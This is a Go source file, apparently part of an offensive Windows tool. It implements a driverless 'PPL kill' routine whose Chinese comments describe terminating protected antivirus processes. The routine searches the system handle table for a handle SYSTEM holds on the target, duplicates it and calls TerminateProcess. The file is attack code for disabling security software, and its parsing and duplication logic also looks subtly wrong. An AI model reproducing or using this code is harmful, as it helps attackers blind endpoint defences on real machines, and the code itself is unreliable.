//go:build windows && !light

package main

import (
	"encoding/binary"
	"errors"
	"fmt"
	"unsafe"
)

// ─── PPL 击杀：无驱动备选（NtDuplicateObject 句柄窃取）───────────────
//
// 本文件原先还包含"借内置驱动做任意内核读、沿 PsActiveProcessHead 遍历 EPROCESS
// 并用特征签名动态定位 EPROCESS.Protection 偏移"的探测路线。内置驱动已换成
// 操作员自备的驱动（若提供进程终止 IOCTL，可把普通杀软进程直接终止；**不具备
// 任意内核读写**），该探测路线及其调用的内核读 helper、配套硬编码 Protection
// 偏移表已整体移除（未使用的 helper 一并删除，不留死代码）。
//
// 因此本文件**不再依赖内置驱动的内核读，因此无驱动也可用（准确性下降）**：
// 只保留下面这条不依赖驱动的路线，全部走 ntdll/kernel32 常规 API 导出。
//
// 思路：PPL 进程句柄不能直接 OpenProcess，但 SYSTEM 上下文（如
// winlogon/LSASS 的子进程）可能已持有目标进程句柄。通过遍历系统句柄表
// （NtQuerySystemInformation），找到 SYSTEM 进程对目标 PID 的 PROCESS 句柄，
// 用 NtDuplicateObject 复制到自身（绕过 PPL 句柄访问检查），再 TerminateProcess。
//
// 该路线无内核写入，但依赖 SYSTEM 进程确实持有目标句柄（常见于被保护杀软）。

// duplicateHandleFromSystem 尝试从 SYSTEM 进程（PID 4）复制目标进程句柄。
// 返回复制的句柄（需 CloseHandle）或错误。
func duplicateHandleFromSystem(targetPID uint32) (uintptr, error) {
	procNtQuery := resolveAPI("ntdll.dll", "NtQuerySystemInformation")
	procNtDup := resolveAPI("ntdll.dll", "NtDuplicateObject")

	// 1. 枚举系统句柄，找 SYSTEM(PID 4) 持有的目标进程句柄
	buf := make([]byte, 0x400000)
	var retLen uint32
	st, _, _ := procNtQuery.Call(16 /*SystemHandleInformation*/, uintptr(unsafe.Pointer(&buf[0])), uintptr(len(buf)), uintptr(unsafe.Pointer(&retLen)))
	if st != 0 {
		return 0, fmt.Errorf("NtQuerySystemInformation: 0x%x", st)
	}
	count := binary.LittleEndian.Uint32(buf[:4])
	const handleEntrySize = 24 // x64
	for i := 0; i < int(count); i++ {
		off := 4 + i*handleEntrySize
		if off+handleEntrySize > len(buf) {
			break
		}
		ownerPID := binary.LittleEndian.Uint32(buf[off+8:]) // UniqueProcessId 在 +8
		ePid := binary.LittleEndian.Uint16(buf[off:])
		objType := buf[off+4]
		hValue := binary.LittleEndian.Uint32(buf[off+12:])
		// 目标进程 PID 匹配 + 进程对象类型 + 由 PID 4 (System) 持有
		if uint32(ePid) == targetPID && ownerPID == 4 && objType == 7 {
			// 2. 复制句柄到当前进程（DUPLICATE_SAME_ACCESS = 0x2）
			curProc, _, _ := resolveAPI("kernel32.dll", "GetCurrentProcess").Call()
			var dupH uintptr
			dupSt, _, _ := procNtDup.Call(curProc, uintptr(hValue), curProc, uintptr(unsafe.Pointer(&dupH)), 0, 0, 2)
			if dupSt == 0 && dupH != 0 {
				return dupH, nil
			}
		}
	}
	return 0, fmt.Errorf("SYSTEM 未持有目标进程句柄")
}

// killPPLNoDriver 无驱动路线：句柄窃取后 TerminateProcess。
func killPPLNoDriver(targetPID uint32) error {
	h, err := duplicateHandleFromSystem(targetPID)
	if err != nil {
		return err
	}
	defer resolveAPI("kernel32.dll", "CloseHandle").Call(h)
	r1, _, _ := resolveAPI("kernel32.dll", "TerminateProcess").Call(h, 1)
	if r1 == 0 {
		return errors.New("TerminateProcess(dup handle) failed")
	}
	return nil
}
